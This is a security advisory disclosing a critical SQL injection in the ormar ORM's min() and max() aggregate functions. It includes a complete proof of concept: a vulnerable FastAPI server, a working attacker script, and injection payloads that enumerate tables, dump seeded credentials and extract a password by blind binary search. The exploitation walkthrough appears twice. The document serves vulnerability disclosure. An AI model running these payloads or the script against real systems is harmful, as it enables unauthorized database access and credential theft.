# ormar is vulnerable to SQL Injection through aggregate functions min() and max()

**GHSA**: GHSA-xxh2-68g9-8jqr | **CVE**: CVE-2026-26198 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-89

**Affected Packages**:
- **ormar** (pip): >= 0.9.9, <= 0.22.0

## Description

# Report of SQL Injection Vulnerability in Ormar ORM

## A SQL Injection attack can be achieved by passing a crafted string to the min() or max() aggregate functions.

## Brief description

When performing aggregate queries, Ormar ORM constructs SQL expressions by passing user-supplied column names directly into `sqlalchemy.text()` without any validation or sanitization. The `min()` and `max()` methods in the `QuerySet` class accept arbitrary string input as the column parameter. While `sum()` and `avg()` are partially protected by an `is_numeric` type check that rejects non-existent fields, `min()` and `max()` skip this validation entirely. As a result, an attacker-controlled string is embedded as raw SQL inside the aggregate function call. Any unauthorized user can exploit this vulnerability to read the entire database contents, including tables unrelated to the queried model, by injecting a subquery as the column parameter.

## Affected versions

```
0.9.9 - 0.12.2
0.20.0b1 - 0.22.0 (latest)
```

The vulnerable `SelectAction.get_text_clause()` method and the `min()`/`max()` aggregate functions were introduced together in commit `ff9d412` (March 12, 2021) and first released in version **0.9.9**. The vulnerable code has never been modified since — `get_text_clause()` is identical in every subsequent version through the latest **0.21.0**.

Versions prior to 0.9.9 do not contain the `min()`/`max()` aggregate feature and are not affected.

The following uses the latest ormar 0.21.0 as an example to illustrate the attack.

## Vulnerability details

When performing an aggregate query, the `QuerySet.max()` method (line 721, `queryset.py`) passes user input to `_query_aggr_function()`. This method creates a `SelectAction` object for each column name. The column string is split by `__` and the last part becomes `self.field_name` — with no validation against the model's actual fields.

The critical vulnerability is in `SelectAction.get_text_clause()` (line 41-43, `select_action.py`), which directly passes `self.field_name` into `sqlalchemy.text()`:

```python
#select_action.py line 41-43
def get_text_clause(self) -> sqlalchemy.sql.expression.TextClause:
    alias = f"{self.table_prefix}_" if self.table_prefix else ""
    return sqlalchemy.text(f"{alias}{self.field_name}")  # unsanitised user input!
```

The `apply_func()` method then wraps this raw text clause inside `func.max()`, producing SQL like `max(<attacker_input>)`. Since `sqlalchemy.text()` treats its argument as literal SQL, any subquery or SQL expression injected through the column name will be executed by the database engine.

The `_query_aggr_function()` method (line 704-719, `queryset.py`) only validates field types for `sum` and `avg`, leaving `min` and `max` completely unprotected:

```python
#queryset.py line 704-719
async def _query_aggr_function(self, func_name: str, columns: List) -> Any:
    func = getattr(sqlalchemy.func, func_name)
    select_actions = [
        SelectAction(select_str=column, model_cls=self.model) for column in columns
    ]
    if func_name in ["sum", "avg"]:          # <-- only sum/avg are checked!
        if any(not x.is_numeric for x in select_actions):
            raise QueryDefinitionError(...)
    select_columns = [x.apply_func(func, use_label=True) for x in select_actions]
    expr = self.build_select_expression().alias(f"subquery_for_{func_name}")
    expr = sqlalchemy.select(*select_columns).select_from(expr)
    result = await self.database.fetch_one(expr)
    return dict(result) if len(result) > 1 else result[0]
```

To reproduce the attack, you can follow the steps below, using a FastAPI application with SQLite as an example.

Note: The PoC consists of two files provided in the attachments — `poc_server.py` (the vulnerable server) and `poc_attacker.py` (the HTTP-based attacker script).
<h2>Start the vulnerable application</h2>
<ol>
<li>Install dependencies:</li>
</ol>
<pre><code class="language-bash">pip install ormar databases aiosqlite fastapi uvicorn httpx
</code></pre>
<ol>
<li>The vulnerable server (<code>poc_server.py</code>) is based on the <strong>official ormar FastAPI example</strong> (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py">ormar/examples/fastapi_quick_start.py</a>). The only modification is the addition of a <code>/items/stats</code> endpoint — a common pattern for applications that provide aggregate statistics. This demonstrates that the vulnerability is easily triggered by natural API design.</li>
</ol>
<p>The server defines three models:</p>
<ul>
<li><code>Category</code> and <code>Item</code> — from the official ormar example (unchanged)</li>
<li><code>AdminUser</code> — simulates internal data (e.g., an admin_users table) that should NOT be accessible through the public API</li>
</ul>
<p>The vulnerable endpoint:</p>
<pre><code class="language-python"># Added endpoint: aggregate statistics (VULNERABLE)
# This is a common and natural pattern — letting users request
# statistics on different columns. The ormar documentation itself
# shows: await Book.objects.max(columns=[&quot;year&quot;])
# See: &lt;https://collerek.github.io/ormar/queries/aggregations/&gt;

@app.get(&quot;/items/stats&quot;)
async def item_stats(
    metric: str = Query(&quot;max&quot;, description=&quot;max or min&quot;),
    column: str = Query(&quot;price&quot;, description=&quot;Column to aggregate&quot;),
):
    &quot;&quot;&quot;Return aggregate statistics for items.&quot;&quot;&quot;
    if metric == &quot;max&quot;:
        result = await Item.objects.max(column)
    elif metric == &quot;min&quot;:
        result = await Item.objects.min(column)
    else:
        return {&quot;error&quot;: &quot;Unsupported metric&quot;}
    return {&quot;metric&quot;: metric, &quot;column&quot;: column, &quot;result&quot;: result}
</code></pre>
<p>The database contains:</p>

Table | Data
-- | --
categories | Electronics
items | Laptop ($999.99), Phone ($699.99), Tablet ($449.99), Monitor ($329.99)
admin_users | root / Sup3r$ecretP@ss! / ak-9f8e7d6c5b4a3210-prod
  | deploy-bot / ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi / ak-1a2b3c4d5e6f7890-ci


<p>The <code>admin_users</code> table is <strong>NOT</strong> exposed via any API endpoint.</p>
<h2>The attack steps</h2>
<p>The PoC requires two terminals:</p>
<p><strong>Terminal 1</strong> — Start the vulnerable server:</p>
<pre><code class="language-bash">python poc_server.py
</code></pre>
<p><strong>Terminal 2</strong> — Run the attacker script:</p>
<pre><code class="language-bash">python poc_attacker.py
</code></pre>
<p>The attacker script (<code>poc_attacker.py</code>) sends HTTP requests to the running server. It has <strong>NO prior knowledge</strong> of the database schema — all information is discovered through the injection. The attacker executes 6 progressive attack stages through the single <code>/items/stats</code> endpoint.</p>
<h2>Principle of vulnerability exploitation</h2>
<h3>1. The attacker confirms injection by sending an arithmetic expression</h3>
<p>The attacker sends <code>GET /items/stats?metric=max&amp;column=1+1</code>. The data flow is:</p>
<pre><code>HTTP request: GET /items/stats?metric=max&amp;column=1+1
    ↓
item_stats(metric=&quot;max&quot;, column=&quot;1+1&quot;)                # poc_server.py
    ↓
Item.objects.max(&quot;1+1&quot;)                                # queryset.py:721
    ↓
_query_aggr_function(func_name=&quot;max&quot;, columns=[&quot;1+1&quot;]) # queryset.py:704
    ↓
SelectAction(select_str=&quot;1+1&quot;, model_cls=Item)          # select_action.py:22
    ↓
_split_value_into_parts(&quot;1+1&quot;)  →  self.field_name = &quot;1+1&quot;
    ↓
# min/max skip the is_numeric check (line 709 only checks sum/avg)
    ↓
get_text_clause()  →  sqlalchemy.text(&quot;1+1&quot;)            # select_action.py:43
    ↓
apply_func(sqlalchemy.func.max)  →  max(1+1)
</code></pre>
<p>Generated SQL:</p>
<pre><code class="language-sql">SELECT max(1+1) AS &quot;1+1&quot;
FROM (SELECT items.id AS id, items.name AS name, items.price AS price,
             items.category AS category
      FROM items) AS subquery_for_max
</code></pre>
<p>The API returns <code>{&quot;metric&quot;:&quot;max&quot;,&quot;column&quot;:&quot;1+1&quot;,&quot;result&quot;:2}</code>, confirming that the arithmetic expression was evaluated as SQL.</p>
<h3>2. The attacker enumerates database tables</h3>
<p>The attacker injects a subquery to read <code>sqlite_master</code>:</p>
<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')
</code></pre>
<p>Which internally calls:</p>
<pre><code class="language-python">await Item.objects.max(
    &quot;(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')&quot;
)
</code></pre>
<p>Generated SQL:</p>
<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'))
       AS &quot;(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')&quot;
FROM (SELECT items.id, items.name, items.price, items.category
      FROM items) AS subquery_for_max
</code></pre>
<p>The API returns <code>categories,admin_users,items</code>, revealing the hidden <code>admin_users</code> table.</p>
<h3>3. The attacker extracts the schema of the target table</h3>
<pre><code>GET /items/stats?metric=max&amp;column=(SELECT sql FROM sqlite_master WHERE name='admin_users')
</code></pre>
<p>The API returns the full <code>CREATE TABLE</code> statement, revealing column names: <code>username</code>, <code>password</code>, <code>api_key</code>.</p>
<h3>4. The attacker dumps all credentials in a single query</h3>
<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10)) FROM admin_users)
</code></pre>
<p>Generated SQL:</p>
<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10))
            FROM admin_users))
       AS &quot;...&quot;
FROM (SELECT items.id, items.name, items.price, items.category
      FROM items) AS subquery_for_max
</code></pre>
<p>The API returns all credentials:</p>
<pre><code>root | Sup3r$ecretP@ss! | ak-9f8e7d6c5b4a3210-prod
deploy-bot | ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi | ak-1a2b3c4d5e6f7890-ci
</code></pre>
<h3>5. Blind boolean-based extraction (when results are not directly visible)</h3>
<p>Even if the API does not return query results directly, the attacker can use boolean-based blind injection to extract data character by character using binary search:</p>
<pre><code>GET /items/stats?metric=max&amp;column=CASE WHEN UNICODE(SUBSTR((SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 THEN 1 ELSE 0 END
</code></pre>
<p>Which internally calls:</p>
<pre><code class="language-python"># &quot;Is the Nth character of root's password greater than ASCII code M?&quot;
await Item.objects.max(
    &quot;CASE WHEN UNICODE(SUBSTR(&quot;
    &quot;(SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 &quot;
    &quot;THEN 1 ELSE 0 END&quot;
)
# Returns 0 → first character is 'S' (ASCII 83)
</code></pre>
<p>By iterating over each position with binary search, the full password <code>Sup3r$ecretP@ss!</code> is extracted in approximately 113 HTTP requests (16 characters x ~7 binary search steps).</p>
<h3>6. The attacker extracts the production API key</h3>
<pre><code>GET /items/stats?metric=max&amp;column=(SELECT api_key FROM admin_users WHERE username='root')
</code></pre>
<p>The API returns: <code>ak-9f8e7d6c5b4a3210-prod</code></p>
<p>All data was extracted through a single public API endpoint using only unauthenticated GET requests.</p>
<!-- notionvc: b3e8123b-0876-4c76-94f6-2281c6cbb3f0 -->## Start the vulnerable application

1. Install dependencies:

```bash
pip install ormar databases aiosqlite fastapi uvicorn httpx
```

1. The vulnerable server (`poc_server.py`) is based on the **official ormar FastAPI example** ([[ormar/examples/fastapi_quick_start.py](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)). The only modification is the addition of a `/items/stats` endpoint — a common pattern for applications that provide aggregate statistics. This demonstrates that the vulnerability is easily triggered by natural API design.

The server defines three models:

- `Category` and `Item` — from the official ormar example (unchanged)
- `AdminUser` — simulates internal data (e.g., an admin_users table) that should NOT be accessible through the public API

The vulnerable endpoint:

```python
# Added endpoint: aggregate statistics (VULNERABLE)
# This is a common and natural pattern — letting users request
# statistics on different columns. The ormar documentation itself
# shows: await Book.objects.max(columns=["year"])
# See: <https://collerek.github.io/ormar/queries/aggregations/>

@app.get("/items/stats")
async def item_stats(
    metric: str = Query("max", description="max or min"),
    column: str = Query("price", description="Column to aggregate"),
):
    """Return aggregate statistics for items."""
    if metric == "max":
        result = await Item.objects.max(column)
    elif metric == "min":
        result = await Item.objects.min(column)
    else:
        return {"error": "Unsupported metric"}
    return {"metric": metric, "column": column, "result": result}
```

The database contains:

| Table | Data |
| --- | --- |
| `categories` | Electronics |
| `items` | Laptop ($999.99), Phone ($699.99), Tablet ($449.99), Monitor ($329.99) |
| `admin_users` | root / Sup3r$ecretP@ss! / ak-9f8e7d6c5b4a3210-prod |
|  | deploy-bot / ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi / ak-1a2b3c4d5e6f7890-ci |

The `admin_users` table is **NOT** exposed via any API endpoint.

## The attack steps

The PoC requires two terminals:

**Terminal 1** — Start the vulnerable server:

```bash
python poc_server.py
```

**Terminal 2** — Run the attacker script:

```bash
python poc_attacker.py
```

The attacker script (`poc_attacker.py`) sends HTTP requests to the running server. It has **NO prior knowledge** of the database schema — all information is discovered through the injection. The attacker executes 6 progressive attack stages through the single `/items/stats` endpoint.

## Principle of vulnerability exploitation

### 1. The attacker confirms injection by sending an arithmetic expression

The attacker sends `GET /items/stats?metric=max&column=1+1`. The data flow is:

```
HTTP request: GET /items/stats?metric=max&column=1+1
    ↓
item_stats(metric="max", column="1+1")                # poc_server.py
    ↓
Item.objects.max("1+1")                                # queryset.py:721
    ↓
_query_aggr_function(func_name="max", columns=["1+1"]) # queryset.py:704
    ↓
SelectAction(select_str="1+1", model_cls=Item)          # select_action.py:22
    ↓
_split_value_into_parts("1+1")  →  self.field_name = "1+1"
    ↓
# min/max skip the is_numeric check (line 709 only checks sum/avg)
    ↓
get_text_clause()  →  sqlalchemy.text("1+1")            # select_action.py:43
    ↓
apply_func(sqlalchemy.func.max)  →  max(1+1)
```

Generated SQL:

```sql
SELECT max(1+1) AS "1+1"
FROM (SELECT items.id AS id, items.name AS name, items.price AS price,
             items.category AS category
      FROM items) AS subquery_for_max
```

The API returns `{"metric":"max","column":"1+1","result":2}`, confirming that the arithmetic expression was evaluated as SQL.

### 2. The attacker enumerates database tables

The attacker injects a subquery to read `sqlite_master`:

```
GET /items/stats?metric=max&column=(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')
```

Which internally calls:

```python
await Item.objects.max(
    "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
)
```

Generated SQL:

```sql
SELECT max((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'))
       AS "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
FROM (SELECT items.id, items.name, items.price, items.category
      FROM items) AS subquery_for_max
```

The API returns `categories,admin_users,items`, revealing the hidden `admin_users` table.

### 3. The attacker extracts the schema of the target table

```
GET /items/stats?metric=max&column=(SELECT sql FROM sqlite_master WHERE name='admin_users')
```

The API returns the full `CREATE TABLE` statement, revealing column names: `username`, `password`, `api_key`.

### 4. The attacker dumps all credentials in a single query

```
GET /items/stats?metric=max&column=(SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10)) FROM admin_users)
```

Generated SQL:

```sql
SELECT max((SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10))
            FROM admin_users))
       AS "..."
FROM (SELECT items.id, items.name, items.price, items.category
      FROM items) AS subquery_for_max
```

The API returns all credentials:

```
root | Sup3r$ecretP@ss! | ak-9f8e7d6c5b4a3210-prod
deploy-bot | ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi | ak-1a2b3c4d5e6f7890-ci
```

### 5. Blind boolean-based extraction (when results are not directly visible)

Even if the API does not return query results directly, the attacker can use boolean-based blind injection to extract data character by character using binary search:

```
GET /items/stats?metric=max&column=CASE WHEN UNICODE(SUBSTR((SELECT password FROM admin_users WHERE username='root'),1,1))>83 THEN 1 ELSE 0 END
```

Which internally calls:

```python
# "Is the Nth character of root's password greater than ASCII code M?"
await Item.objects.max(
    "CASE WHEN UNICODE(SUBSTR("
    "(SELECT password FROM admin_users WHERE username='root'),1,1))>83 "
    "THEN 1 ELSE 0 END"
)
# Returns 0 → first character is 'S' (ASCII 83)
```

By iterating over each position with binary search, the full password `Sup3r$ecretP@ss!` is extracted in approximately 113 HTTP requests (16 characters x ~7 binary search steps).

### 6. The attacker extracts the production API key

```
GET /items/stats?metric=max&column=(SELECT api_key FROM admin_users WHERE username='root')
```

The API returns: `ak-9f8e7d6c5b4a3210-prod`

All data was extracted through a single public API endpoint using only unauthenticated GET requests.
## The complete POC

### poc_server.py (Vulnerable Server)

Based on the official ormar FastAPI example ([[fastapi_quick_start.py](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)):

```python
"""
CVE PoC — Vulnerable Server
=============================
Based on the OFFICIAL ormar FastAPI example:
    <https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py>

The only modification is the addition of a /items/stats endpoint (line 63-76),
which is a common pattern for any application that provides aggregate statistics.

Usage:
    python poc_server.py
"""

# ── Original official example code (unchanged) ───────────────
# Source: ormar/examples/fastapi_quick_start.py

from contextlib import asynccontextmanager
from typing import List, Optional

import databases
import ormar
import sqlalchemy
import uvicorn
from fastapi import FastAPI, Query

DATABASE_URL = "sqlite:///poc_vuln.db"

ormar_base_config = ormar.OrmarConfig(
    database=databases.Database(DATABASE_URL), metadata=sqlalchemy.MetaData()
)

class Category(ormar.Model):
    ormar_config = ormar_base_config.copy(tablename="categories")

    id: int = ormar.Integer(primary_key=True)
    name: str = ormar.String(max_length=100)

class Item(ormar.Model):
    ormar_config = ormar_base_config.copy(tablename="items")

    id: int = ormar.Integer(primary_key=True)
    name: str = ormar.String(max_length=100)
    price: float = ormar.Float(default=0)
    category: Optional[Category] = ormar.ForeignKey(Category, nullable=True)

# This table simulates internal data that should NOT be accessible
# through the public API — e.g. an admin_users table in the same database.
class AdminUser(ormar.Model):
    ormar_config = ormar_base_config.copy(tablename="admin_users")

    id: int = ormar.Integer(primary_key=True)
    username: str = ormar.String(max_length=100)
    password: str = ormar.String(max_length=200)
    api_key: str = ormar.String(max_length=200)

@asynccontextmanager
async def lifespan(app: FastAPI):
    database_ = ormar_base_config.database
    if not database_.is_connected:
        await database_.connect()

    # Create tables
    engine = sqlalchemy.create_engine(DATABASE_URL)
    ormar_base_config.metadata.create_all(engine)
    engine.dispose()

    # Seed sample data
    if not await Item.objects.count():
        cat = await Category.objects.create(name="Electronics")
        await Item.objects.create(name="Laptop", price=999.99, category=cat)
        await Item.objects.create(name="Phone", price=699.99, category=cat)
        await Item.objects.create(name="Tablet", price=449.99, category=cat)
        await Item.objects.create(name="Monitor", price=329.99, category=cat)

    if not await AdminUser.objects.count():
        await AdminUser.objects.create(
            username="root",
            password="Sup3r$ecretP@ss!",
            api_key="ak-9f8e7d6c5b4a3210-prod",
        )
        await AdminUser.objects.create(
            username="deploy-bot",
            password="ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi",
            api_key="ak-1a2b3c4d5e6f7890-ci",
        )

    print("\\n  [Server] Ready. Database seeded with items + admin_users.")
    print("  [Server] The admin_users table is NOT exposed via any API endpoint.\\n")

    yield

    if database_.is_connected:
        await database_.disconnect()

app = FastAPI(
    title="Item Catalog API",
    description="Based on official ormar FastAPI example",
    lifespan=lifespan,
)

# ── Original endpoints from official example (unchanged) ──────

@app.get("/items/", response_model=List[Item])
async def get_items():
    items = await Item.objects.select_related("category").all()
    return items

@app.post("/items/", response_model=Item)
async def create_item(item: Item):
    await item.save()
    return item

@app.post("/categories/", response_model=Category)
async def create_category(category: Category):
    await category.save()
    return category

@app.put("/items/{item_id}")
async def get_item(item_id: int, item: Item):
    item_db = await Item.objects.get(pk=item_id)
    return await item_db.update(**item.model_dump())

@app.delete("/items/{item_id}")
async def delete_item(item_id: int, item: Item = None):
    if item:
        return {"deleted_rows": await item.delete()}
    item_db = await Item.objects.get(pk=item_id)
    return {"deleted_rows": await item_db.delete()}

# ── Added endpoint: aggregate statistics (VULNERABLE) ─────────
# This is a common and natural pattern — letting users request
# statistics on different columns. The ormar documentation itself
# shows: await Book.objects.max(columns=["year"])
# See: <https://collerek.github.io/ormar/queries/aggregations/>

@app.get("/items/stats")
async def item_stats(
    metric: str = Query("max", description="max or min"),
    column: str = Query("price", description="Column to aggregate"),
):
    """Return aggregate statistics for items."""
    if metric == "max":
        result = await Item.objects.max(column)
    elif metric == "min":
        result = await Item.objects.min(column)
    else:
        return {"error": "Unsupported metric"}
    return {"metric": metric, "column": column, "result": result}

@app.get("/health")
async def health():
    return {"status": "ok"}

# ── Main ──────────────────────────────────────────────────────
if __name__ == "__main__":
    import os
    # Clean previous database for reproducibility
    if os.path.exists("poc_vuln.db"):
        os.unlink("poc_vuln.db")
    print("=" * 60)
    print("  CVE PoC — Vulnerable Server")
    print("  Based on: ormar/examples/fastapi_quick_start.py")
    print("  Added:    GET /items/stats?metric=max&column=<input>")
    print("  Docs:     <http://127.0.0.1:8000/docs>")
    print("=" * 60)
    uvicorn.run(app, host="127.0.0.1", port=8000, log_level="warning")
```

### poc_attacker.py (Attacker Script)

```python
"""
CVE PoC — Attacker Script
===========================
Exploits the SQL injection in /items/stats endpoint.
Sends HTTP requests to the running FastAPI server.

Prerequisites:
    1. Start the server first:  python poc_server.py
    2. Then run this script:    python poc_attacker.py

The attacker has NO prior knowledge of the database schema.
All information is discovered through the injection.
"""

import sys
import httpx

TARGET = "<http://127.0.0.1:8000>"
ENDPOINT = "/items/stats"

def inject(payload: str) -> str:
    """Send a single injection payload via the public API."""
    resp = httpx.get(TARGET + ENDPOINT, params={"metric": "max", "column": payload})
    data = resp.json()
    return data.get("result")

def main():
    # ── Pre-check ─────────────────────────────────────────────
    try:
        r = httpx.get(TARGET + "/health", timeout=3)
        if r.status_code != 200:
            sys.exit(1)
    except httpx.ConnectError:
        print(f"Cannot connect to {TARGET}")
        print(f"Start the server first: python poc_server.py")
        sys.exit(1)

    # ── Stage 0: Legitimate request ──────────────────────────
    result = inject("price")
    print(f"[Stage 0] Normal usage: max(price) = {result}")

    # ── Stage 1: Confirm injection ────────────────────────────
    result = inject("1+1")
    print(f"[Stage 1] max('1+1') = {result}")
    if result == 2:
        print("  → SQL INJECTION CONFIRMED")

    # ── Stage 2: Enumerate tables ─────────────────────────────
    payload = "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
    result = inject(payload)
    tables = str(result).split(",") if result else []
    print(f"[Stage 2] Tables: {result}")

    # ── Stage 3: Extract schema ───────────────────────────────
    target_table = [t for t in tables if "admin" in t.lower()]
    target_table = target_table[0] if target_table else tables[-1]
    payload = f"(SELECT sql FROM sqlite_master WHERE name='{target_table}')"
    result = inject(payload)
    print(f"[Stage 3] Schema of {target_table}: {result}")

    # ── Stage 4: Dump all credentials ─────────────────────────
    payload = (
        f"(SELECT GROUP_CONCAT("
        f"username || ' | ' || password || ' | ' || api_key, CHAR(10))"
        f" FROM {target_table})"
    )
    result = inject(payload)
    print(f"[Stage 4] Credentials:\\n{result}")

    # ── Stage 5: Blind extraction ─────────────────────────────
    payload = f"LENGTH((SELECT password FROM {target_table} WHERE username='root'))"
    pw_len = int(inject(payload))
    extracted = ""
    request_count = 0
    for pos in range(1, pw_len + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = (
                f"CASE WHEN UNICODE(SUBSTR("
                f"(SELECT password FROM {target_table} "
                f"WHERE username='root'),{pos},1))>{mid} "
                f"THEN 1 ELSE 0 END"
            )
            result = inject(payload)
            request_count += 1
            if result == 1:
                low = mid + 1
            else:
                high = mid - 1
        extracted += chr(low)
        sys.stdout.write(f"\\r[Stage 5] Extracting: {extracted}")
        sys.stdout.flush()
    print(f"\\n[Stage 5] Password extracted: {extracted} ({request_count} requests)")

    # ── Stage 6: Steal API key ────────────────────────────────
    payload = f"(SELECT api_key FROM {target_table} WHERE username='root')"
    result = inject(payload)
    print(f"[Stage 6] Production API key: {result}")

    print(f"\\nTotal HTTP requests: {request_count + 6}")
    print("All data extracted through a single public API endpoint.")

if __name__ == "__main__":
    main()
```

## Vulnerability Impact

This attack allows an unauthenticated user to read the entire database contents. Any API endpoint that passes user-controlled input to `Model.objects.min()` or `Model.objects.max()` becomes a full SQL injection entry point.

The attack is confirmed to work with the following database backends:

- SQLite (via aiosqlite)
- PostgreSQL (via asyncpg) — subquery syntax is identical
- MySQL (via aiomysql) — subquery syntax is compatible

**Realistic attack scenarios include:**

- **REST APIs** with user-selectable aggregate fields: `GET /items/stats?column=<input>`
- **GraphQL resolvers** that accept field names as arguments
- **Dynamic report generators** where users select columns for aggregation

The vulnerable server in this PoC is based on the **official ormar FastAPI example**, demonstrating that the vulnerability is easily triggered through natural, documented API design patterns. The ormar documentation itself shows this exact usage pattern: `await Book.objects.max(columns=["year"])` ([[ormar aggregations docs](https://collerek.github.io/ormar/queries/aggregations/)](https://collerek.github.io/ormar/queries/aggregations/)).

## Display of attack results
Terminal 1 — Start server:
![image](https://github.com/user-attachments/assets/4c8b4a20-75da-4aba-b649-f818e46165dd)
Terminal 2 — Run attacker:
<img width="2004" height="1478" alt="image (1)" src="https://github.com/user-attachments/assets/ae41657b-2730-4fab-ac01-e79acd267bde" />
<img width="1984" height="1500" alt="image (2)" src="https://github.com/user-attachments/assets/cbe0d652-d4d4-458c-998b-e636d6c362a1" />
